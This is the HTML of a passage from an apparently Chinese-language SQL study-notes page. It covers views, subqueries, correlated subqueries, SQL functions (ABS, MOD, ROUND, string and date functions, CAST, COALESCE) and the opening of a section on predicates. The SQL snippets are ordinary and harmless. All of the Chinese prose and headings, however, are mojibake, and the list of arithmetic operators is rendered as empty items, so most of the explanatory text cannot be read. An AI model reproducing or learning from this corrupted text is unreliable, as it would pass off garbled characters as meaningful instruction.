è§†å›¾ä¿å­˜çš„æ˜¯ä»è¡¨ä¸­å–å‡ºæ•°æ®æ‰€ä½¿ç”¨çš„ select è¯­å¥.</p><h4 id="è§†å›¾çš„ä¼˜ç‚¹"><a href="#è§†å›¾çš„ä¼˜ç‚¹" class="headerlink" title="è§†å›¾çš„ä¼˜ç‚¹"></a>è§†å›¾çš„ä¼˜ç‚¹</h4><ul><li>æ— éœ€ä¿å­˜æ•°æ®</li><li>å°†é¢‘ç¹ä½¿ç”¨çš„ select è¯­å¥ä¿å­˜æˆè§†å›¾ï¼Œå°±ä¸ç”¨é‡æ–°ä¹¦å†™</li></ul><h3 id="åˆ›å»ºè§†å›¾çš„æ–¹æ³•"><a href="#åˆ›å»ºè§†å›¾çš„æ–¹æ³•" class="headerlink" title="åˆ›å»ºè§†å›¾çš„æ–¹æ³•"></a>åˆ›å»ºè§†å›¾çš„æ–¹æ³•</h3><p>ä½¿ç”¨ <code>create view</code> è¯­å¥:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">view</span> è§†å›¾åç§°(&lt;è§†å›¾åˆ—å<span class="hljs-number">1</span>&gt;, &lt;è§†å›¾åˆ—å<span class="hljs-number">2</span>&gt;, ......) <br><span class="hljs-keyword">as</span><br>&lt;<span class="hljs-keyword">select</span>è¯­å¥&gt;<br></code></pre></td></tr></table></figure><p>select è¯­å¥ä¸­åˆ—çš„æ’åˆ—é¡ºåºå’Œè§†å›¾ä¸­åˆ—çš„æ’åˆ—é¡ºåºç›¸åŒ.</p><p>è§†å›¾å¯ä»¥å†™åœ¨ select è¯­å¥çš„ from ä¸­.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, ...<br>  <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">view</span> name<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨è§†å›¾çš„æŸ¥è¯¢"><a href="#ä½¿ç”¨è§†å›¾çš„æŸ¥è¯¢" class="headerlink" title="ä½¿ç”¨è§†å›¾çš„æŸ¥è¯¢"></a>ä½¿ç”¨è§†å›¾çš„æŸ¥è¯¢</h4><p>é€šå¸¸ä¸ºä¸¤ä¸ªæ­¥éª¤:</p><ol><li>æ‰§è¡Œå®šä¹‰è§†å›¾çš„ select è¯­å¥</li><li>æ ¹æ®å¾—åˆ°çš„ç»“æœï¼Œæ‰§è¡Œåœ¨ from å­å¥ä¸­ä½¿ç”¨çš„è§†å›¾çš„ select è¯­å¥</li></ol><p>ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨è§†å›¾å°±æ˜¯æŠŠè§†å›¾æ”¾åœ¨ from ä¹‹åã€‚</p><p>å¤šé‡è§†å›¾ä¼šé™ä½ SQL çš„æ€§èƒ½.</p><h3 id="è§†å›¾çš„é™åˆ¶1-â€“-å®šä¹‰è§†å›¾æ—¶ä¸èƒ½ä½¿ç”¨-order-by-å­å¥"><a href="#è§†å›¾çš„é™åˆ¶1-â€“-å®šä¹‰è§†å›¾æ—¶ä¸èƒ½ä½¿ç”¨-order-by-å­å¥" class="headerlink" title="è§†å›¾çš„é™åˆ¶1 â€“ å®šä¹‰è§†å›¾æ—¶ä¸èƒ½ä½¿ç”¨ order by å­å¥"></a>è§†å›¾çš„é™åˆ¶1 â€“ å®šä¹‰è§†å›¾æ—¶ä¸èƒ½ä½¿ç”¨ order by å­å¥</h3><h3 id="è§†å›¾çš„é™åˆ¶2-â€“-å¯¹è§†å›¾è¿›è¡Œæ›´æ–°"><a href="#è§†å›¾çš„é™åˆ¶2-â€“-å¯¹è§†å›¾è¿›è¡Œæ›´æ–°" class="headerlink" title="è§†å›¾çš„é™åˆ¶2 â€“ å¯¹è§†å›¾è¿›è¡Œæ›´æ–°"></a>è§†å›¾çš„é™åˆ¶2 â€“ å¯¹è§†å›¾è¿›è¡Œæ›´æ–°</h3><p>å®šä¹‰è§†å›¾çš„ select è¯­å¥æ»¡è¶³æŸäº›æ¡ä»¶ï¼Œè§†å›¾å°±å¯ä»¥è¢«æ›´æ–°(å³å¯¹è§†å›¾ä½¿ç”¨ insertã€deleteã€updateç­‰), å‡ ä¸ªå…·æœ‰ä»£è¡¨æ€§çš„æ¡ä»¶:</p><ol><li>select å­å¥ä¸­æœªä½¿ç”¨ distinct</li><li>from å­å¥ä¸­åªæœ‰ä¸€å¼ è¡¨</li><li>æœªä½¿ç”¨ group by å­å¥</li><li>æœªä½¿ç”¨ having å­å¥<br>è§†å›¾å’Œè¡¨éœ€è¦åŒæ—¶è¿›è¡Œæ›´æ–°ï¼Œå› æ­¤é€šè¿‡æ±‡æ€»å¾—åˆ°çš„è§†å›¾æ— æ³•è¿›è¡Œæ›´æ–°.</li></ol><p>PostgreSQL ä¸­çš„è§†å›¾ä¼šè¢«åˆå§‹è®¾å®šä¸ºåªè¯», è‹¥è¦å…è®¸æ›´æ–°:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">replace</span> rule insert_rule<br><span class="hljs-keyword">as</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">insert</span><br><span class="hljs-keyword">to</span> &lt;<span class="hljs-keyword">view</span> name&gt; <span class="hljs-keyword">do</span> instead<br><span class="hljs-keyword">insert</span>  <span class="hljs-keyword">into</span> ...<br></code></pre></td></tr></table></figure><h3 id="åˆ é™¤è§†å›¾"><a href="#åˆ é™¤è§†å›¾" class="headerlink" title="åˆ é™¤è§†å›¾"></a>åˆ é™¤è§†å›¾</h3><p>ä½¿ç”¨ drop view è¯­å¥:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">drop</span> <span class="hljs-built_in">view</span> &lt;<span class="hljs-built_in">view</span> name&gt;(&lt;è§†å›¾åˆ—å<span class="hljs-number">1</span>&gt;, ...)<br></code></pre></td></tr></table></figure><p>åˆ é™¤å¤šé‡è§†å›¾ï¼Œå³å­˜åœ¨å…³è”çš„è§†å›¾:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">view</span> &lt;<span class="hljs-keyword">view</span> <span class="hljs-type">name</span>&gt; <span class="hljs-keyword">cascade</span>;<br></code></pre></td></tr></table></figure><p><code>cascade</code> æ˜¯é‡å çš„æ„æ€ã€‚</p><h2 id="5-2-å­æŸ¥è¯¢"><a href="#5-2-å­æŸ¥è¯¢" class="headerlink" title="5-2 å­æŸ¥è¯¢"></a>5-2 å­æŸ¥è¯¢</h2><p>å­æŸ¥è¯¢å°±æ˜¯ä¸€æ¬¡æ€§è§†å›¾ã€‚</p><p>å­æŸ¥è¯¢å°†ç”¨æ¥å®šä¹‰è§†å›¾çš„ select è¯­å¥ç›´æ¥ç”¨äº from å­å¥ä¸­.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_type, cnt_product<br>  <span class="hljs-keyword">from</span> (<br>    <span class="hljs-keyword">select</span> product_type, <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">as</span> cnt_product<br>        <span class="hljs-keyword">from</span> Product<br>        <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> product_type<br>      ) <span class="hljs-keyword">as</span> ProductSum;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>Productsum</code> ä¹Ÿæ˜¯ä¸€æ¬¡æ€§åç§°.</p><p>select è¯­å¥çš„æ‰§è¡Œé¡ºåºï¼Œå…ˆæ‰§è¡Œ from å­å¥ä¸­çš„ select è¯­å¥ï¼Œç„¶åæ‰æ‰§è¡Œå¤–å±‚çš„ select è¯­å¥ã€‚</p><h4 id="å¢åŠ å­æŸ¥è¯¢çš„å±‚æ•°"><a href="#å¢åŠ å­æŸ¥è¯¢çš„å±‚æ•°" class="headerlink" title="å¢åŠ å­æŸ¥è¯¢çš„å±‚æ•°"></a>å¢åŠ å­æŸ¥è¯¢çš„å±‚æ•°</h4><p>å­æŸ¥è¯¢çš„å±‚æ•°åŸåˆ™ä¸Šæ²¡æœ‰é™åˆ¶.</p><p>å°½é‡é¿å…åµŒå¥—ï¼Œå…¶ä¼šä½¿å¯è¯»æ€§å’Œæ€§èƒ½å˜å·®ã€‚</p><h3 id="å­æŸ¥è¯¢çš„åç§°"><a href="#å­æŸ¥è¯¢çš„åç§°" class="headerlink" title="å­æŸ¥è¯¢çš„åç§°"></a>å­æŸ¥è¯¢çš„åç§°</h3><p>åŸåˆ™ä¸Šå­æŸ¥è¯¢å¿…é¡»è®¾å®šåç§°, éœ€ä½¿ç”¨ as å…³é”®è¯.</p><h3 id="æ ‡é‡å­æŸ¥è¯¢-scalar-subquery"><a href="#æ ‡é‡å­æŸ¥è¯¢-scalar-subquery" class="headerlink" title="æ ‡é‡å­æŸ¥è¯¢ scalar subquery"></a>æ ‡é‡å­æŸ¥è¯¢ scalar subquery</h3><h4 id="ä»€ä¹ˆæ˜¯æ ‡é‡"><a href="#ä»€ä¹ˆæ˜¯æ ‡é‡" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ‡é‡"></a>ä»€ä¹ˆæ˜¯æ ‡é‡</h4><p>æ ‡é‡å°±æ˜¯å•ä¸€çš„æ„æ€.</p><p>æ ‡é‡å­æŸ¥è¯¢çš„ç‰¹æ®Šé™åˆ¶ä¸º: å¿…é¡»è€Œä¸”åªèƒ½è¿”å›1è¡Œ1åˆ—çš„ç»“æœã€‚</p><p>ä¹Ÿå°±æ˜¯è¿”å›è¡¨ä¸­æŸä¸€è¡Œçš„æŸä¸€åˆ—çš„å€¼ã€‚</p><p>æ ‡é‡å­æŸ¥è¯¢çš„è¿”å›å€¼å¯ä»¥ç”¨åœ¨ &#x3D; æˆ–è€… &lt;&gt; è¿™æ ·éœ€è¦å•ä¸€å€¼çš„æ¯”è¾ƒè¿ç®—ç¬¦ä¸­.</p><h4 id="åœ¨-where-å­å¥ä¸­ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢"><a href="#åœ¨-where-å­å¥ä¸­ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢" class="headerlink" title="åœ¨ where å­å¥ä¸­ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢"></a>åœ¨ where å­å¥ä¸­ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢</h4><p>è§£å†³åœ¨ where å­å¥ä¸­ä¸èƒ½ä½¿ç”¨èšåˆå‡½æ•°çš„é—®é¢˜.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, sale_price<br>  <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">where</span> sale_price &gt; (<span class="hljs-keyword">select</span> <span class="hljs-keyword">avg</span>(sale_price)<br>                        <span class="hljs-keyword">from</span> Product);<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œé¡ºåºï¼Œé¦–å…ˆæ‰§è¡Œå†…å±‚çš„å­æŸ¥è¯¢ï¼Œç„¶åæ‰§è¡Œå¤–å±‚çš„æŸ¥è¯¢ã€‚</p><h3 id="æ ‡é‡å­æŸ¥è¯¢çš„ä¹¦å†™ä½ç½®"><a href="#æ ‡é‡å­æŸ¥è¯¢çš„ä¹¦å†™ä½ç½®" class="headerlink" title="æ ‡é‡å­æŸ¥è¯¢çš„ä¹¦å†™ä½ç½®"></a>æ ‡é‡å­æŸ¥è¯¢çš„ä¹¦å†™ä½ç½®</h3><p>é€šå¸¸ä»»ä½•å¯ä»¥ä½¿ç”¨å•ä¸€å€¼çš„ä½ç½®éƒ½å¯ä»¥ä½¿ç”¨ã€‚å‡ ä¹æ‰€æœ‰çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨.</p><h3 id="ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢æ—¶çš„æ³¨æ„äº‹é¡¹"><a href="#ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢æ—¶çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢æ—¶çš„æ³¨æ„äº‹é¡¹"></a>ä½¿ç”¨æ ‡é‡å­æŸ¥è¯¢æ—¶çš„æ³¨æ„äº‹é¡¹</h3><p>å³è¯¥å­æŸ¥è¯¢ä¸èƒ½è¿”å›å¤šè¡Œç»“æœã€‚</p><h2 id="5-3-å…³è”å­æŸ¥è¯¢"><a href="#5-3-å…³è”å­æŸ¥è¯¢" class="headerlink" title="5-3 å…³è”å­æŸ¥è¯¢"></a>5-3 å…³è”å­æŸ¥è¯¢</h2><h3 id="æ™®é€šå­æŸ¥è¯¢å’Œå…³è”å­æŸ¥è¯¢çš„åŒºåˆ«"><a href="#æ™®é€šå­æŸ¥è¯¢å’Œå…³è”å­æŸ¥è¯¢çš„åŒºåˆ«" class="headerlink" title="æ™®é€šå­æŸ¥è¯¢å’Œå…³è”å­æŸ¥è¯¢çš„åŒºåˆ«"></a>æ™®é€šå­æŸ¥è¯¢å’Œå…³è”å­æŸ¥è¯¢çš„åŒºåˆ«</h3><h4 id="ä½¿ç”¨å…³è”å­æŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆ"><a href="#ä½¿ç”¨å…³è”å­æŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ä½¿ç”¨å…³è”å­æŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆ"></a>ä½¿ç”¨å…³è”å­æŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆ</h4><p>åœ¨å­æŸ¥è¯¢ä¸­æ·»åŠ çš„ where å­å¥çš„æ¡ä»¶.</p><h3 id="å…³è”å­æŸ¥è¯¢ä¹Ÿæ˜¯ç”¨æ¥å¯¹é›†åˆè¿›è¡Œåˆ‡åˆ†çš„"><a href="#å…³è”å­æŸ¥è¯¢ä¹Ÿæ˜¯ç”¨æ¥å¯¹é›†åˆè¿›è¡Œåˆ‡åˆ†çš„" class="headerlink" title="å…³è”å­æŸ¥è¯¢ä¹Ÿæ˜¯ç”¨æ¥å¯¹é›†åˆè¿›è¡Œåˆ‡åˆ†çš„"></a>å…³è”å­æŸ¥è¯¢ä¹Ÿæ˜¯ç”¨æ¥å¯¹é›†åˆè¿›è¡Œåˆ‡åˆ†çš„</h3><h3 id="ç»“åˆæ¡ä»¶ä¸€å®šè¦å†™åœ¨å­æŸ¥è¯¢ä¸­"><a href="#ç»“åˆæ¡ä»¶ä¸€å®šè¦å†™åœ¨å­æŸ¥è¯¢ä¸­" class="headerlink" title="ç»“åˆæ¡ä»¶ä¸€å®šè¦å†™åœ¨å­æŸ¥è¯¢ä¸­"></a>ç»“åˆæ¡ä»¶ä¸€å®šè¦å†™åœ¨å­æŸ¥è¯¢ä¸­</h3><p>å…³è”å­æŸ¥è¯¢å°±æ˜¯æœ‰ä¸€ä¸ªå…³è”æ¡ä»¶ã€‚</p><p>å…³è”åç§°å­˜åœ¨ä½œç”¨åŸŸ.</p><h1 id="ç¬¬6ç« -å‡½æ•°ã€è°“è¯ã€CASEè¡¨è¾¾å¼"><a href="#ç¬¬6ç« -å‡½æ•°ã€è°“è¯ã€CASEè¡¨è¾¾å¼" class="headerlink" title="ç¬¬6ç«  å‡½æ•°ã€è°“è¯ã€CASEè¡¨è¾¾å¼"></a>ç¬¬6ç«  å‡½æ•°ã€è°“è¯ã€CASEè¡¨è¾¾å¼</h1><h2 id="6-1-å„ç§å„æ ·çš„å‡½æ•°"><a href="#6-1-å„ç§å„æ ·çš„å‡½æ•°" class="headerlink" title="6-1 å„ç§å„æ ·çš„å‡½æ•°"></a>6-1 å„ç§å„æ ·çš„å‡½æ•°</h2><h3 id="å‡½æ•°çš„ç§ç±»"><a href="#å‡½æ•°çš„ç§ç±»" class="headerlink" title="å‡½æ•°çš„ç§ç±»"></a>å‡½æ•°çš„ç§ç±»</h3><p>å¤§è‡´å¯ä»¥åˆ†ä¸º:</p><ul><li>ç®—æ•°å‡½æ•°</li><li>å­—ç¬¦ä¸²å‡½æ•°</li><li>æ—¥æœŸå‡½æ•°</li><li>è½¬æ¢å‡½æ•°</li><li>èšåˆå‡½æ•°</li></ul><h3 id="ç®—æ•°å‡½æ•°"><a href="#ç®—æ•°å‡½æ•°" class="headerlink" title="ç®—æ•°å‡½æ•°"></a>ç®—æ•°å‡½æ•°</h3><ul><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>&#x2F;<br><code>numeric</code>æ•°æ®ç±»å‹, æ ¼å¼ä¸º(å…¨ä½“ä½æ•°ï¼Œå°æ•°ä½æ•°).</li></ul><h4 id="ABS-â€“-ç»å¯¹å€¼"><a href="#ABS-â€“-ç»å¯¹å€¼" class="headerlink" title="ABS â€“ ç»å¯¹å€¼"></a>ABS â€“ ç»å¯¹å€¼</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ABS</span><span class="hljs-params">(æ•°å€¼)</span></span><br></code></pre></td></tr></table></figure><p><code>abs</code> æ˜¯è®¡ç®—ç»å¯¹å€¼(absolute value)çš„å‡½æ•°.</p><p><code>abs</code> è®¡ç®—å‡ºæŸä¸€åˆ—çš„ç»å¯¹å€¼ã€‚</p><p>ç»å¤§å¤šæ•°å‡½æ•°å¯¹äº null éƒ½è¿”å›null.</p><h4 id="MOD-â€“-æ±‚ä½™"><a href="#MOD-â€“-æ±‚ä½™" class="headerlink" title="MOD â€“ æ±‚ä½™"></a>MOD â€“ æ±‚ä½™</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">MOD</span><span class="hljs-params">(è¢«é™¤æ•°ï¼Œé™¤æ•°)</span></span><br></code></pre></td></tr></table></figure><p>åªèƒ½å¯¹æ•´æ•°ç±»å‹çš„åˆ—ä½¿ç”¨ <code>MOD</code> å‡½æ•°ã€‚</p><h4 id="ROUND-â€“-å››èˆäº”å…¥"><a href="#ROUND-â€“-å››èˆäº”å…¥" class="headerlink" title="ROUND â€“ å››èˆäº”å…¥"></a>ROUND â€“ å››èˆäº”å…¥</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ROUND</span></span>(å¯¹è±¡æ•°å€¼ï¼Œä¿ç•™å°æ•°çš„ä½æ•°)</span><br></code></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²å‡½æ•°"><a href="#å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å‡½æ•°"></a>å­—ç¬¦ä¸²å‡½æ•°</h3><h4 id="â€“-æ‹¼æ¥"><a href="#â€“-æ‹¼æ¥" class="headerlink" title="|| â€“ æ‹¼æ¥"></a>|| â€“ æ‹¼æ¥</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">å­—ç¬¦ä¸²<span class="hljs-number">1</span> <span class="hljs-string">|| å­—ç¬¦ä¸²2</span><br></code></pre></td></tr></table></figure><h4 id="LENGTH-â€“-å­—ç¬¦ä¸²é•¿åº¦"><a href="#LENGTH-â€“-å­—ç¬¦ä¸²é•¿åº¦" class="headerlink" title="LENGTH â€“ å­—ç¬¦ä¸²é•¿åº¦"></a>LENGTH â€“ å­—ç¬¦ä¸²é•¿åº¦</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">LENGTH</span></span>(å­—ç¬¦ä¸²)</span><br></code></pre></td></tr></table></figure><p><code>LENGTH</code> æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½.</p><h4 id="LOWER-â€“-å°å†™è½¬æ¢"><a href="#LOWER-â€“-å°å†™è½¬æ¢" class="headerlink" title="LOWER â€“ å°å†™è½¬æ¢"></a>LOWER â€“ å°å†™è½¬æ¢</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">LOWER</span><span class="hljs-params">(å­—ç¬¦ä¸²)</span></span><br></code></pre></td></tr></table></figure><h4 id="UPPER-â€“-å¤§å†™è½¬æ¢"><a href="#UPPER-â€“-å¤§å†™è½¬æ¢" class="headerlink" title="UPPER â€“ å¤§å†™è½¬æ¢"></a>UPPER â€“ å¤§å†™è½¬æ¢</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">UPPER</span><span class="hljs-params">(å­—ç¬¦ä¸²)</span></span><br></code></pre></td></tr></table></figure><h4 id="REPLACE-â€“-å­—ç¬¦ä¸²æ›¿æ¢"><a href="#REPLACE-â€“-å­—ç¬¦ä¸²æ›¿æ¢" class="headerlink" title="REPLACE â€“ å­—ç¬¦ä¸²æ›¿æ¢"></a>REPLACE â€“ å­—ç¬¦ä¸²æ›¿æ¢</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">REPLACE</span></span>(å¯¹è±¡å­—ç¬¦ä¸²ï¼Œæ›¿æ¢å‰å­—ç¬¦ä¸²ï¼Œæ›¿æ¢åå­—ç¬¦ä¸²)</span><br></code></pre></td></tr></table></figure><h4 id="SUBSTRING-â€“-å­—ç¬¦ä¸²æˆªå–"><a href="#SUBSTRING-â€“-å­—ç¬¦ä¸²æˆªå–" class="headerlink" title="SUBSTRING â€“ å­—ç¬¦ä¸²æˆªå–"></a>SUBSTRING â€“ å­—ç¬¦ä¸²æˆªå–</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">SUBSTRING</span></span>(å¯¹è±¡å­—ç¬¦ä¸² <span class="hljs-variable">from</span> æˆªå–çš„èµ·å§‹ä½ç½® <span class="hljs-variable">for</span> æˆªå–çš„å­—ç¬¦æ•°)</span><br></code></pre></td></tr></table></figure><h3 id="æ—¥æœŸå‡½æ•°"><a href="#æ—¥æœŸå‡½æ•°" class="headerlink" title="æ—¥æœŸå‡½æ•°"></a>æ—¥æœŸå‡½æ•°</h3><h4 id="CURRENT-DATE-â€“-å½“å‰æ—¥æœŸ"><a href="#CURRENT-DATE-â€“-å½“å‰æ—¥æœŸ" class="headerlink" title="CURRENT_DATE â€“ å½“å‰æ—¥æœŸ"></a>CURRENT_DATE â€“ å½“å‰æ—¥æœŸ</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_date</span><br></code></pre></td></tr></table></figure><h4 id="CURRENT-TIME-â€“-å½“å‰æ—¶é—´"><a href="#CURRENT-TIME-â€“-å½“å‰æ—¶é—´" class="headerlink" title="CURRENT_TIME â€“ å½“å‰æ—¶é—´"></a>CURRENT_TIME â€“ å½“å‰æ—¶é—´</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_time</span><br></code></pre></td></tr></table></figure><h4 id="CURRENT-TIMESTAMP-â€“-å½“å‰æ—¥æœŸå’Œæ—¶é—´"><a href="#CURRENT-TIMESTAMP-â€“-å½“å‰æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="CURRENT_TIMESTAMP â€“ å½“å‰æ—¥æœŸå’Œæ—¶é—´"></a>CURRENT_TIMESTAMP â€“ å½“å‰æ—¥æœŸå’Œæ—¶é—´</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_timestamp</span><br></code></pre></td></tr></table></figure><h4 id="EXTRACT-â€“-æˆªå–æ—¥æœŸå…ƒç´ "><a href="#EXTRACT-â€“-æˆªå–æ—¥æœŸå…ƒç´ " class="headerlink" title="EXTRACT â€“ æˆªå–æ—¥æœŸå…ƒç´ "></a>EXTRACT â€“ æˆªå–æ—¥æœŸå…ƒç´ </h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">EXTRACT</span><span class="hljs-params">(æ—¥æœŸå…ƒç´  from æ—¥æœŸ)</span></span><br></code></pre></td></tr></table></figure><p>year, month, day, hour, minute, second.</p><h3 id="è½¬æ¢å‡½æ•°"><a href="#è½¬æ¢å‡½æ•°" class="headerlink" title="è½¬æ¢å‡½æ•°"></a>è½¬æ¢å‡½æ•°</h3><p>è½¬æ¢åœ¨ SQL ä¸­ä¸»è¦æœ‰ä¸¤å±‚æ„æ€:</p><ol><li>æ•°æ®ç±»å‹çš„è½¬æ¢ï¼Œå³ cast</li><li>å€¼çš„è½¬æ¢<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cast</span><span class="hljs-params">(è½¬æ¢å‰çš„å€¼ as æƒ³è¦è½¬æ¢çš„æ•°æ®ç±»å‹)</span></span><br></code></pre></td></tr></table></figure></li></ol><h4 id="COALESCE-â€“-å°†-null-è½¬æ¢ä¸ºå…¶ä»–å€¼"><a href="#COALESCE-â€“-å°†-null-è½¬æ¢ä¸ºå…¶ä»–å€¼" class="headerlink" title="COALESCE â€“ å°† null è½¬æ¢ä¸ºå…¶ä»–å€¼"></a>COALESCE â€“ å°† null è½¬æ¢ä¸ºå…¶ä»–å€¼</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">coalesce</span><span class="hljs-params">(æ•°æ®<span class="hljs-number">1</span>ï¼Œæ•°æ®<span class="hljs-number">2</span>ï¼Œ...)</span></span><br></code></pre></td></tr></table></figure><p>è¿”å›å¯å˜å‚æ•°ä¸­å·¦ä¾§å¼€å§‹ç¬¬ä¸€ä¸ªä¸æ˜¯ null çš„å€¼ã€‚</p><p>æ„Ÿè§‰ä¸æ˜¯è½¬æ¢ã€‚</p><h2 id="6-2-è°“è¯"><a href="#6-2-è°“è¯" class="headerlink" title="6-2 è°“è¯"></a>6-2 è°“è¯</h2><h3 id="ä»€ä¹ˆæ˜¯è°“è¯-predicate"><a href="#ä»€ä¹ˆæ˜¯è°“è¯-predicate" class="headerlink" title="ä»€ä¹ˆæ˜¯è°“è¯(predicate)"></a>ä»€ä¹ˆæ˜¯è°“è¯(predicate)</h3><p>è°“è¯æ˜¯å‡½æ•°çš„ä¸€ç§ï¼Œæ˜¯éœ€è¦æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„å‡½æ•°ï¼Œè¯¥æ¡ä»¶å°±æ˜¯è¿”å›å€¼æ˜¯çœŸå€¼(true)ã€‚</p><p>&#x3D;, &lt;, &gt;, &lt;&gt; ç­‰æ¯”è¾ƒè¿ç®—ç¬¦ï¼Œå…¶æ­£å¼åç§°å°±æ˜¯æ¯”è¾ƒè°“è¯.</p><h3 id="LIKE-è°“è¯-â€“-å­—ç¬¦ä¸²çš„éƒ¨åˆ†ä¸€è‡´æŸ¥è¯¢"><a href="#LIKE-è°“è¯-â€“-å­—ç¬¦ä¸²çš„éƒ¨åˆ†ä¸€è‡´æŸ¥è¯¢" class="headerlink" title="LIKE è°“è¯ â€“ å­—ç¬¦ä¸²çš„éƒ¨åˆ†ä¸€è‡´æŸ¥è¯¢"></a>LIKE è°“è¯ â€“ å­—ç¬¦ä¸²çš„éƒ¨åˆ†ä¸€è‡´æŸ¥è¯¢</h3><p>éƒ¨åˆ†ä¸€è‡´å¤§ä½“å¯ä»¥åˆ†ä¸º:</p><ul><li>å‰æ–¹ä¸€è‡´</li><li>ä¸­é—´ä¸€è‡´</li><li>åæ–¹ä¸€è‡´<br>éƒ¨åˆ†ä¸€è‡´ï¼Œå³å­—ç¬¦ä¸²ä¸­çš„ä¸€éƒ¨åˆ†ç›¸åŒã€‚</li></ul><h4 